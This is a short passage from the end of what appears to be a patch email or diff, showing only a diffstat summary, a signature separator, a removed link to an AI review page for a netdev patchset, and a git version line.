+ 7 files changed, 74 insertions(+), 8 deletions(-)
 
 -- 
-Sashiko AI review · https://netdev-ai.bots.linux.dev/sashiko/#/patchset/20261104062026.80599-1-shubham%40octane.security
+2.55.0
+
+
